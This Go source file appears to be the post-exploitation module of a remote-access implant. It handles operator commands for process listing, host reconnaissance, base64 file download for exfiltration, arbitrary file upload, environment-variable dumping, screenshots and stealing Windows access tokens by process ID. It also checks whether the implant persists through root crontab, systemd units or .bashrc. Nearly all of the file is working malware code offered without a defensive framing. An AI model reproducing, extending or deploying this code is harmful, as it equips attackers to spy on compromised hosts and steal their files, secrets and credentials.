package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
)

func handlePostex(cmd string) string {
	op := strings.TrimPrefix(cmd, "__px:")
	switch {
	case op == "ps":
		if runtime.GOOS == "windows" {
			procs := enumerateProcessNames()
			if len(procs) == 0 {
				return "Error: no process list"
			}
			text := strings.Join(procs, "\n")
			if len(text) > 8000 {
				text = text[:8000]
			}
			return text
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return "Error: " + err.Error()
		}
		var rows []string
		for _, e := range entries {
			if len(rows) >= 200 {
				break
			}
			name := e.Name()
			if name == "" || name[0] < '0' || name[0] > '9' {
				continue
			}
			comm, _ := os.ReadFile("/proc/" + name + "/comm")
			rows = append(rows, name+" "+strings.TrimSpace(string(comm)))
		}
		if len(rows) == 0 {
			return "Error: no process list"
		}
		return strings.Join(rows, "\n")
	case op == "recon":
		host, _ := os.Hostname()
		u, _ := user.Current()
		name := ""
		if u != nil {
			name = u.Username
		}
		cwd, _ := os.Getwd()
		var addrs []string
		ifaces, _ := net.Interfaces()
		for _, i := range ifaces {
			a, _ := i.Addrs()
			for _, addr := range a {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
					addrs = append(addrs, ipnet.IP.String())
				}
			}
		}
		return fmt.Sprintf("host=%s user=%s cwd=%s addrs=%s", host, name, cwd, strings.Join(addrs, ","))
	case strings.HasPrefix(op, "download:"):
		path := strings.TrimPrefix(op, "download:")
		info, err := os.Stat(path)
		if err != nil || info.IsDir() {
			return "Error: not a file"
		}
		if info.Size() > 1024*1024 {
			return "Error: file too large"
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return "Error: " + err.Error()
		}
		return "FILE:" + base64.StdEncoding.EncodeToString(data)
	case strings.HasPrefix(op, "upload:"):
		rest := strings.TrimPrefix(op, "upload:")
		idx := strings.LastIndex(rest, ":")
		if idx < 0 {
			return "Error: bad upload"
		}
		path, b64 := rest[:idx], rest[idx+1:]
		data, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return "Error: " + err.Error()
		}
		if len(data) > 1024*1024 {
			return "Error: file too large"
		}
		if err := os.WriteFile(path, data, 0600); err != nil {
			return "Error: " + err.Error()
		}
		return fmt.Sprintf("uploaded %d bytes", len(data))
	case op == "processes":
		return handlePostex("__px:ps")
	case op == "env":
		var lines []string
		for _, e := range os.Environ() {
			lines = append(lines, e)
		}
		return strings.Join(lines, "\n")
	case op == "help":
		return "postex commands: ps, processes, recon, screenshot, env, download:<path>, upload:<path>:<b64>, persist_check, token:whoami, token:list, token:steal:<pid>"
	case op == "persist_check":
		return checkPersistence()
	case op == "screenshot":
		return captureScreenshot()
	case strings.HasPrefix(op, "token:"):
		return handleTokenOp(strings.TrimPrefix(op, "token:"))
	default:
		return "Error: unknown postex op"
	}
}

func checkPersistence() string {
	var found []string
	if runtime.GOOS == "linux" {
		exe, _ := os.Executable()
		crontab, err := os.ReadFile("/var/spool/cron/crontabs/root")
		if err == nil && strings.Contains(string(crontab), exe) {
			found = append(found, "crontab: "+exe)
		}
		for _, svc := range []string{"/etc/systemd/system/", "/lib/systemd/system/"} {
			entries, _ := os.ReadDir(svc)
			for _, e := range entries {
				data, err := os.ReadFile(svc + e.Name())
				if err == nil && strings.Contains(string(data), exe) {
					found = append(found, "systemd: "+e.Name())
				}
			}
		}
		bashrc, _ := os.ReadFile(os.Getenv("HOME") + "/.bashrc")
		if strings.Contains(string(bashrc), exe) {
			found = append(found, "bashrc")
		}
	}
	if len(found) == 0 {
		return "No persistence mechanisms detected"
	}
	return "Persistence: " + strings.Join(found, ", ")
}
